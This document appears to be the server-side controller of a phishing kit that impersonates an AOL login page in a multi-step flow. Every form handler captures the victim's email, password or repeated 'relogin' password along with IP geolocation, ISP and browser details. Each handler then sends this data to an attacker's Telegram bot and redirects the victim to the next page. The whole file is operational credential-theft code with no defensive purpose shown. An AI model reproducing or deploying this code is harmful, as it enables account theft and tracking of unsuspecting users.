const { sendMessageFor } = require("simple-telegram-message");
const ipInfo = require("ip-info-finder");
const { getClientIp } = require("request-ip");
const { botToken, chatId } = require("../../settings");

exports.login = (req, res) => {
	return res.render("login");
};

exports.loginPost = async (req, res) => {
	const { username } = req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return ipInfo
			.getIPInfo(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const {
		ipAddress,
		Coordinates,
		City,
		Region,
		postalCode,
		Country,
		Time,
		provider,
		ASN,
	} = iPDetails;

	const userAgent = req.headers["user-agent"];
	const systemLang = req.headers["accept-language"];

	const message =
		`✅ UPDATE TEAM | A0L | USER_${ipAddress}\n\n` +
		`👤 EMAIL ADDRESS\n` +
		`EMAIL            : ${username}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`COORDINATES      : ${Coordinates}\n` +
		`CITY             : ${City}\n` +
		`STATE            : ${Region}\n` +
		`ZIP CODE         : ${postalCode}\n` +
		`COUNTRY          : ${Country}\n` +
		`TIME             : ${Time}\n` +
		`ISP              : ${provider} ${ASN}\n\n` +
		`💻 SYSTEM INFO\n` +
		`USER AGENT       : ${userAgent}\n` +
		`SYSTEM LANGUAGE  : ${systemLang}\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/login/2");
};

exports.login2 = (req, res) => {
	res.render("login2");
};

exports.loginPost2 = async (req, res) => {
	const { password } = req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return ipInfo
			.getIPInfo(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const { ipAddress, Time } = iPDetails;

	const message =
		`✅ UPDATE TEAM | A0L | USER_${ipAddress}\n\n` +
		`👤 EMAIL PASSWORD\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${Time}\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/login/3");
};

exports.login3 = (req, res) => {
	res.render("login3");
};

exports.loginPost3 = async (req, res) => {
	const { password } = req.body;
	const clientIP = getClientIp(req);

	function getIPDetails() {
		return ipInfo
			.getIPInfo(clientIP)
			.then((data) => {
				var data = data;
				return data;
			})
			.catch((err) => {
				console.log(err);
			});
	}

	const iPDetails = await getIPDetails();
	const { ipAddress, Time } = iPDetails;

	const message =
		`✅ UPDATE TEAM | A0L | USER_${ipAddress}\n\n` +
		`👤 EMAIL PASSWORD (RELOGIN)\n` +
		`PASSWORD         : ${password}\n\n` +
		`🌍 GEO-IP INFO\n` +
		`IP ADDRESS       : ${ipAddress}\n` +
		`TIME             : ${Time}\n`;

	const sendMessage = sendMessageFor(botToken, chatId);
	sendMessage(message);

	res.redirect("/auth/complete");
};

exports.complete = (req, res) => {
	return res.render("complete");
};

exports.page404Redirect = (req, res) => {
	return res.redirect("/auth/login");
};